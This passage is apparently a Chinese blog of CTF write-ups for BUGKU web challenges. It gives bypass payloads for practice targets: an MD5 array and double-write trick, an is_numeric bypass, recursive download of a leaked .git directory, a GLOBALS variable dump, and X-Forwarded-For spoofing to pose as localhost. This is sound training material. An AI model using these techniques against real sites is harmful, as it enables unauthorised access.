class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#MD5%E7%A2%B0%E6%92%9E"><span class="nav-number">24.1.</span> <span class="nav-text">#MD5碰撞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87%E5%93%9F"><span class="nav-number">25.</span> <span class="nav-text">各种绕过哟</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#sha1%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87"><span class="nav-number">25.1.</span> <span class="nav-text">#sha1数组绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%BD%A6%E7%A5%9E"><span class="nav-number">26.</span> <span class="nav-text">秋名山车神</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%A1%E7%AE%97%E8%84%9A%E6%9C%AC"><span class="nav-number">26.1.</span> <span class="nav-text">#计算脚本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB"><span class="nav-number">27.</span> <span class="nav-text">速度要快</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC%E5%A4%84%E7%90%86%E8%AF%B7%E6%B1%82"><span class="nav-number">27.1.</span> <span class="nav-text">#脚本处理请求</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#file-get-contents"><span class="nav-number">28.</span> <span class="nav-text">file_get_contents</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87"><span class="nav-number">28.1.</span> <span class="nav-text">#伪协议绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Simple-SQL-injection"><span class="nav-number">29.</span> <span class="nav-text">Simple SQL injection</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">29.1.</span> <span class="nav-text">#SQL注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2"><span class="nav-number">30.</span> <span class="nav-text">成绩查询</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="nav-number">30.1.</span> <span class="nav-text">#SQL联合注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#no-select"><span class="nav-number">31.</span> <span class="nav-text">no select</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81"><span class="nav-number">31.1.</span> <span class="nav-text">#万能密码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#login2"><span class="nav-number">32.</span> <span class="nav-text">login2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5md5%E7%BB%95%E8%BF%87"><span class="nav-number">32.1.</span> <span class="nav-text">#sql注入md5绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="nav-number">33.</span> <span class="nav-text">sql注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E7%9A%84sql%E7%9B%B2%E6%B3%A8"><span class="nav-number">33.1.</span> <span class="nav-text">#基于布尔的sql盲注</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%83%BD%E8%BF%87%E6%BB%A4%E4%BA%86"><span class="nav-number">34.</span> <span class="nav-text">都过滤了</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87"><span class="nav-number">34.1.</span> <span class="nav-text">#布尔盲注+命令执行绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%87%8F%E6%B3%95%E6%9F%A5%E8%AF%A2%E7%BB%95%E8%BF%87"><span class="nav-number">34.2.</span> <span class="nav-text">减法查询绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#login1"><span class="nav-number">35.</span> <span class="nav-text">login1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL%E7%BA%A6%E6%9D%9F%E6%94%BB%E5%87%BB"><span class="nav-number">35.1.</span> <span class="nav-text">#SQL约束攻击</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%95%99%E8%A8%80%E6%9D%BF"><span class="nav-number">36.</span> <span class="nav-text">留言板</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E6%80%A7xss"><span class="nav-number">36.1.</span> <span class="nav-text">#反射性xss</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%95%99%E8%A8%80%E6%9D%BF1"><span class="nav-number">37.</span> <span class="nav-text">留言板1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#xss"><span class="nav-number">37.1.</span> <span class="nav-text">#xss</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">38.</span> <span class="nav-text">文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-1"><span class="nav-number">38.1.</span> <span class="nav-text">#文件包含</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cookie"><span class="nav-number">39.</span> <span class="nav-text">cookie</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#cookie%E4%BC%AA%E9%80%A0"><span class="nav-number">39.1.</span> <span class="nav-text">#cookie伪造</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#never-give-up"><span class="nav-number">40.</span> <span class="nav-text">never_give_up</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#erge-%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E"><span class="nav-number">40.1.</span> <span class="nav-text">erge()函数漏洞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB2"><span class="nav-number">41.</span> <span class="nav-text">文件包含2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC-%E8%9A%81%E5%89%91%E8%BF%9E%E9%A9%AC"><span class="nav-number">41.1.</span> <span class="nav-text">方法一:一句话木马+蚁剑连马</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9Arce"><span class="nav-number">41.2.</span> <span class="nav-text">方法二：rce</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezbypass"><span class="nav-number">42.</span> <span class="nav-text">ezbypass</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DRCE"><span class="nav-number">42.1.</span> <span class="nav-text">#无数字字母RCE</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#No-one-knows-regex-better-than-me"><span class="nav-number">43.</span> <span class="nav-text">No one knows regex better than me</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#php%E7%89%B9%E6%80%A7"><span class="nav-number">43.1.</span> <span class="nav-text">#php特性</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%EF%BC%9F%E6%AD%A3%E5%88%99%EF%BC%9F"><span class="nav-number">44.</span> <span class="nav-text">字符？正则？</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#php%E7%89%B9%E6%80%A7-1"><span class="nav-number">44.1.</span> <span class="nav-text">#php特性</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Flask-FileUpload"><span class="nav-number">45.</span> <span class="nav-text">Flask_FileUpload</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#python%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-number">45.1.</span> <span class="nav-text">#python代码执行</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xxx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA"><span class="nav-number">46.</span> <span class="nav-text">xxx二手交易市场</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0RCE"><span class="nav-number">46.1.</span> <span class="nav-text">#文件上传RCE</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-number">47.</span> <span class="nav-text">文件上传</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0RCE-1"><span class="nav-number">47.1.</span> <span class="nav-text">#文件上传RCE</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#getshell"><span class="nav-number">48.</span> <span class="nav-text">getshell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87disable-function"><span class="nav-number">48.1.</span> <span class="nav-text">#绕过disable_function</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%82%B9login%E5%92%8B%E6%B2%A1%E5%8F%8D%E5%BA%94"><span class="nav-number">49.</span> <span class="nav-text">点login咋没反应</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80"><span class="nav-number">49.1.</span> <span class="nav-text">#反序列化基础</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Simple-SSTI-1"><span class="nav-number">50.</span> <span class="nav-text">Simple_SSTI_1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SSTI"><span class="nav-number">50.1.</span> <span class="nav-text">#SSTI</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%94%E5%B9%B4%E5%A4%A7%E5%90%892"><span class="nav-number">51.</span> <span class="nav-text">兔年大吉2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">51.1.</span> <span class="nav-text">#php反序列化</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#unserialize-Noteasy"><span class="nav-number"></span> <span class="nav-text">unserialize-Noteasy</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#create-function"><span class="nav-number">1.</span> <span class="nav-text">create_function()</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Simple-SSTI-2"><span class="nav-number"></span> <span class="nav-text">Simple_SSTI_2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%97%AA%E7%94%B5%E5%8D%81%E5%85%AD%E9%9E%AD"><span class="nav-number"></span> <span class="nav-text">闪电十六鞭</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%89%E6%85%B0%E5%A5%96"><span class="nav-number"></span> <span class="nav-text">安慰奖</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#decrypt"><span class="nav-number"></span> <span class="nav-text">decrypt</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Apache-Log4j2-RCE"><span class="nav-number"></span> <span class="nav-text">Apache Log4j2 RCE</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Apache-log4j%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.</span> <span class="nav-text">Apache log4j介绍</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#newphp"><span class="nav-number"></span> <span class="nav-text">newphp</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sodirty"><span class="nav-number"></span> <span class="nav-text">sodirty</span></a></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="wanTh3flag"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">wanTh3flag</p>
  <div class="site-description" itemprop="description">一条有梦想的咸鱼</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">173</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">28</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">124</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="/2323277194" title="qq → 2323277194" rel="noopener me"><i class="fab fa-qq fa-fw"></i>qq</a>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
  </div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="返回顶部">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://wanth3f1ag.top/2024/11/25/BUGKU-web/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="wanTh3flag">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="root@wanth3f1ag">
      <meta itemprop="description" content="一条有梦想的咸鱼">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="BUGKU--web | root@wanth3f1ag">
      <meta itemprop="description" content="BUGKU--web">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          BUGKU--web
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2024-11-25 15:24:08" itemprop="dateCreated datePublished" datetime="2024-11-25T15:24:08+08:00">2024-11-25</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-12-01 19:22:28" itemprop="dateModified" datetime="2025-12-01T19:22:28+08:00">2025-12-01</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%B5%9B%E9%A2%98wp/" itemprop="url" rel="index"><span itemprop="name">赛题wp</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>43k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>39 分钟</span>
    </span>
</div>

            <div class="post-description">BUGKU--web</div>
        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h2 id="滑稽"><a href="#滑稽" class="headerlink" title="滑稽"></a>滑稽</h2><h3 id="F12"><a href="#F12" class="headerlink" title="#F12"></a>#F12</h3><p><img src="/./../image/achieve/202411/BUGKU/image-20241125153012282.png" alt="image-20241125153012282"></p>
<p>源代码就有flag</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241125153042040.png" alt="image-20241125153042040"></p>
<h2 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h2><h3 id="前端js"><a href="#前端js" class="headerlink" title="#前端js"></a>#前端js</h3><p><img src="/./../image/achieve/202411/BUGKU/image-20241125153453676.png" alt="image-20241125153453676"></p>
<p>题目说算对就能拿到flag，但是我发现这里只能输入一个数字，点击验证的话也抓不到包，然后查看源码发现是限制了输入的数字位数，改成3位就再填入答案就能拿到flag了</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241125153647739.png" alt="image-20241125153647739"></p>
<h2 id="alert"><a href="#alert" class="headerlink" title="alert"></a>alert</h2><h3 id="源码flag"><a href="#源码flag" class="headerlink" title="#源码flag"></a>#源码flag</h3><p><img src="/./../image/achieve/202411/BUGKU/image-20241125153903194.png" alt="image-20241125153903194"></p>
<p>出现了很多的弹窗，是js语句alert的代码</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241125153951559.png" alt="image-20241125153951559"></p>
<p>在源代码底下就有flag，拿去解密就可以拿到了</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241125154219421.png" alt="image-20241125154219421"></p>
<p>flag{19760efbde5ba7ec9d7a861a071687eb}</p>
<h2 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h2><h3 id="随机抓包有flag"><a href="#随机抓包有flag" class="headerlink" title="#随机抓包有flag"></a>#随机抓包有flag</h3><p>这个题打开是一直有跳转</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241125170523418.png" alt="image-20241125170523418"></p>
<p>在源码中找到flag is here</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241125170808813.png" alt="image-20241125170808813"></p>
<p>我多截了几个图，然后不小心就截到了有flag的</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241125170840141.png" alt="image-20241125170840141"></p>
<p>但是我们还是正常做一下哈</p>
<p>用bp抓包，再不断发包，在response里面找带有flag的就可以了</p>
<h2 id="头等舱"><a href="#头等舱" class="headerlink" title="头等舱"></a>头等舱</h2><h3 id="响应头"><a href="#响应头" class="headerlink" title="#响应头"></a>#响应头</h3><p><img src="/./../image/achieve/202411/BUGKU/image-20241125171030828.png" alt="image-20241125171030828"></p>
<p>flag在响应头中</p>
<h2 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h2><h3 id="GET传参"><a href="#GET传参" class="headerlink" title="#GET传参"></a>#GET传参</h3><p><img src="/./../image/achieve/202411/BUGKU/image-20241125182502224.png" alt="image-20241125182502224"></p>
<p>直接get传参传what&#x3D;flag就可以了</p>
<h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h2><h3 id="POST传参"><a href="#POST传参" class="headerlink" title="#POST传参"></a>#POST传参</h3><p>跟上一题是一样的，不过这道题是post传参</p>
<h2 id="source"><a href="#source" class="headerlink" title="source"></a>source</h2><h3 id="git泄露"><a href="#git泄露" class="headerlink" title="#.git泄露"></a>#.git泄露</h3><p>flag在源代码中被注释掉了，看起来是base64解码，拿去解码一下发现是假的flag</p>
<p>应该是常规的信息收集，那我们就扫一下目录</p>
<p><img src="/../image/achieve/202411/BUGKU/image-20250428085701831.png" alt="image-20250428085701831"></p>
<p>看到一个flag.txt，访问一下发现也是假的，然后我们可以看到上面的.git文件，猜测是git信息泄露</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241125184238472.png" alt="image-20241125184238472"></p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget <span class="punctuation">-</span>r http<span class="punctuation">:</span><span class="comment">//url/.git</span></span><br></pre></td></tr></table></figure>

<p>把git文件扒下来进行分析</p>
<p>先试用命令<strong>git reflog</strong></p>
<p><code>git reflog</code> 是一个 Git 命令，用于查看本地仓库中的引用日志（Reference Logs）。引用日志记录了仓库中的 HEAD 和分支引用的改动历史，可以帮助用户找回丢失的提交或者分支。具体而言，<code>git reflog</code> 命令可以显示最近的 HEAD 和分支引用的变动，包括提交、重置、合并等操作，以及相应的操作哈希值和操作描述。</p>
<p><img src="/../image/achieve/202411/BUGKU/image-20250428090145263.png" alt="image-20250428090145263"></p>
<p>然后一个个用git show进行查看就能找到真正的flag了</p>
<p><img src="/../image/achieve/202411/BUGKU/image-20250428090722129.png" alt="image-20250428090722129"></p>
<h2 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h2><h3 id="is-numeric绕过-弱比较"><a href="#is-numeric绕过-弱比较" class="headerlink" title="#is_numeric绕过+弱比较"></a>#is_numeric绕过+弱比较</h3><p><img src="/./../image/achieve/202411/BUGKU/image-20241125185209527.png" alt="image-20241125185209527"></p>
<p>这里应该是嵌套的一个if语句吧，因为最后有输出我们传入的num。结合弱比较和is_numeric的作用，直接传入num&#x3D;1e就能满足判断条件</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241125185739491.png" alt="image-20241125185739491"></p>
<h2 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h2><h3 id="md5绕过"><a href="#md5绕过" class="headerlink" title="#md5绕过"></a>#md5绕过</h3><p>出现编码，看着像是md5哈希值加密，我们先拿去解码一下看看，这个哈希值恰好是一个全为0的值，意思就是空文件，什么都没有</p>
<p>根据题目，这可能是备份文件泄露</p>
<h4 id="常见的网站源码备份文件后缀名"><a href="#常见的网站源码备份文件后缀名" class="headerlink" title="常见的网站源码备份文件后缀名"></a>常见的网站源码备份文件后缀名</h4><ul>
<li>.rar</li>
<li>.zip</li>
<li>.7z</li>
<li>.tar.gz</li>
<li>.bak</li>
<li>.swp</li>
<li>.txt</li>
<li>.html</li>
</ul>
<h4 id="常见的网站源码备份文件名"><a href="#常见的网站源码备份文件名" class="headerlink" title="常见的网站源码备份文件名"></a>常见的网站源码备份文件名</h4><ul>
<li>web</li>
<li>website</li>
<li>backup</li>
<li>back</li>
<li>www</li>
<li>wwwroot</li>
<li>temp</li>
</ul>
<p>我们先用御剑扫一下目录找到了备份文件，下载下来发现是代码审计题</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strstr</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>], <span class="string">&#x27;?&#x27;</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>,<span class="number">1</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;key&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="comment">// 双写绕过</span></span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="comment">// 变量覆盖</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$key1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$key2</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$key1</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$key2</span>) &amp;&amp; <span class="variable">$key1</span> !== <span class="variable">$key2</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>.<span class="string">&quot;取得flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里的话就是md5绕过验证了，我们可以知道，当变量是数组的时候，他们的md5是相等的，但这里我们还需要注意的是变量名的验证</p>
<ol>
<li><code>$str = str_replace(&#39;key&#39;,&#39;&#39;,$str);</code>：这行代码去掉了查询参数中的 “key” 字符串。</li>
</ol>
<p>所以这里我们用双写进行绕过验证</p>
<figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line"></span><br><span class="line">/?kkeyey1<span class="comment">[]</span>=1&amp;kkeyey2<span class="comment">[]</span>=2</span><br></pre></td></tr></table></figure>

<h2 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag1.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;args&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$args</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;args&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^\w+$/&quot;</span>,<span class="variable">$args</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;args error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;var_dump($<span class="subst">$args</span>);&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>分析一下正则匹配</p>
<p><code>preg_match(&quot;/^\w+$/&quot;,$args)</code></p>
<p>这段代码的作用是检查 <code>$args</code> 是否仅由字母、数字或下划线字符组成，且至少包含一个以上的字符</p>
<p>最关键的是最后的<code>$$args</code>,这是可变变量的意思，如<code>$args</code>的值是另一个变量的变量名。那么<code>$$args</code>就代表另一个变量。所以我们就给args赋值一个变量名，那么PHP的九大全局变量，一个一个试。</p>
<h3 id="九大全局变量"><a href="#九大全局变量" class="headerlink" title="九大全局变量"></a>九大全局变量</h3><ul>
<li>$_POST [用于接收post提交的数据]</li>
<li>$_GET [用于获取url地址栏的参数数据]</li>
<li>$_FILES [用于文件就收的处理img 最常见]</li>
<li>$_COOKIE [用于获取与setCookie()中的name 值]</li>
<li>$_SESSION [用于存储session的值或获取session中的值]</li>
<li>$_REQUEST [具有get,post的功能，但比较慢]</li>
<li>SERVER[是预定义服务器变量的一种，所有SERVER[是预定义服务器变量的一种，所有_SERVER [是预定义服务器变量的一种，所有_SERVER开头的都</li>
<li>$GLOBALS [一个包含了全部变量的全局组合数组]</li>
<li>$_ENV [ 是一个包含服务器端环境变量的数组。它是PHP中一个超级全局变量，我们可以在PHP 程序的任何地方直接访问它]</li>
</ul>
<p>因为题目提示flag In the variable，所以flag是作为数组变量存储在里面的</p>
<p>所以我们直接使用GLOBALS全局变量显示出所有的数组的键值对</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241125194129448.png" alt="image-20241125194129448"></p>
<h2 id="本地管理员"><a href="#本地管理员" class="headerlink" title="本地管理员"></a>本地管理员</h2><h3 id="伪造请求头"><a href="#伪造请求头" class="headerlink" title="#伪造请求头"></a>#伪造请求头</h3><p>先使用弱口令发现打不通，然后我在源码中看到有被注释掉的base64编码，解码后是test123，猜测是admin的密码</p>
<p>我们抓包提交一下</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241125194924245.png" alt="image-20241125194924245"></p>
<p>根据提示，这里需要伪造管理员的ip进行登录，我们添加一下x-forwarded-for: 127.0.0.1</p>
